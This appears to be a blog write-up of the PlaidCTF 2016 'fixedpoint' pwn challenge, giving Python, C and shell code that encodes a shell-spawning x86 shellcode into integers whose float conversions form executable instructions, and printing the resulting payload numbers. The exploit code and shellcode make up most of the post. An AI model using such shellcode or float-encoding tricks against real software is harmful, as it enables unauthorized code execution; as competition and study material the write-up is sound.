---
layout: post
alias: "/blog/2016/04/18/plaidctf-2016-fixedpoint/"
title: "PlaidCTF 2016 fixedpoint"
date: 2016-04-18T06:00:02+09:00
tags: [ "ctf", "pwn", "writeup", "plaidctf" ]
---

I like pwn with given the source code, and this is fun.

## solution

-   search the writable instructions using binary-seach
-   construct a shellcode and jump there

## implementation

### a.py

``` python
#!/usr/bin/env python3

payload = ''
payload += 'xor ebx,ebx; nop; dec ecx\n'
payload += 'add ebx,1; dec ecx\n'
payload += 'shl ebx,14; dec ecx\n'
payload += 'add eax,ebx; nop; dec ecx\n'
payload += 'mov ebx,eax; nop; dec ecx\n'

# http://shell-storm.org/shellcode/files/shellcode-752.php
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

for c in shellcode:
    i = 1
    while i <= c:
        if c & i:
            payload += 'add BYTE PTR [eax], {}; dec ecx\n'.format(i)
        i <<= 1
    payload += 'inc eax; nop; nop; dec ecx\n'

payload += 'dec eax; nop; nop; dec ecx\n' * len(shellcode)
payload += 'jmp eax; nop; dec ecx\n'

print(payload, end='')
```

### a.c

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

int main(int argc, char** argv) {
    char trg[4];
    for (int i = 0; i < 4; ++ i) {
        int d;
        scanf("%x", &d);
        trg[i] = d;
    }
    printf("find %02hhx %02hhx %02hhx %02hhx %d\n", trg[0], trg[1], trg[2], trg[3], *(int *)trg);
    long long lo = 0, hi = INT_MAX + 1ll;
    while (lo + 1 < hi) { // search
        int d = (lo + hi) / 2;
        float f = ((float)d)/1337.0;
        char *t = (char *)&f;
        printf("%d %02hhx %02hhx %02hhx %02hhx %d\n", d, t[0], t[1], t[2], t[3], *(int *)t);
        if (*(int *)trg == *(int *)t) return 0;
        *(*(int *)trg > *(int *)t ? &lo : &hi) = d;
    }
    printf("not found\n");
    return 1;
}
```

### a.sh

``` sh
#!/bin/sh
while read line ; do
    echo "$line" | as -msyntax=intel -mnaked-reg --32 -aln -o /dev/null | sed -e 's/.*0000 \(\w\+\) .*/\1/; s/../& /g' | ./a.out | tail -n 1 | cut -f 1 -d ' ' | tr -cd '0-9a-f'
    echo -n ' '
done
echo done
```

### usage

``` sh
$ clang -m32 a.c
$ ./a.py > a.txt
$ ./a.sh < a.txt
1586567296 710631808 782514112 1586430848 1585555200 706460096 788605376 876227008 1583361024 706460096 744794560 1051470272 1401967488 1583361024 706460096 711936448 722889152 788605376 876227008 1051470272 1401967488 1583361024 706460096 876227008 1051470272 1401967488 1583361024 706460096 788605376 1051470272 1583361024 744794560 876227008 1051470272 1583361024 706460096 711936448 722889152 744794560 876227008 1583361024 706460096 711936448 722889152 744794560 876227008 1583361024 706460096 711936448 788605376 876227008 1051470272 1583361024 744794560 876227008 1051470272 1583361024 744794560 876227008 1051470272 1583361024 706460096 711936448 722889152 744794560 876227008 1583361024 711936448 876227008 1051470272 1583361024 706460096 744794560 876227008 1051470272 1583361024 711936448 722889152 744794560 876227008 1051470272 1583361024 706460096 744794560 1401967488 1583361024 706460096 711936448 876227008 1051470272 1401967488 1583361024 788605376 876227008 1401967488 1583361024 706460096 711936448 744794560 1583361024 706460096 722889152 744794560 1051470272 1401967488 1583361024 1401967488 1583361024 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1583362304 1586815616 done
```
